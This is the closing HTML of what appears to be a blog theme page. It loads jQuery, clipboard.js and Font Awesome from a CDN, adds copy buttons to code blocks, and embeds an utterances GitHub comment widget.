  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
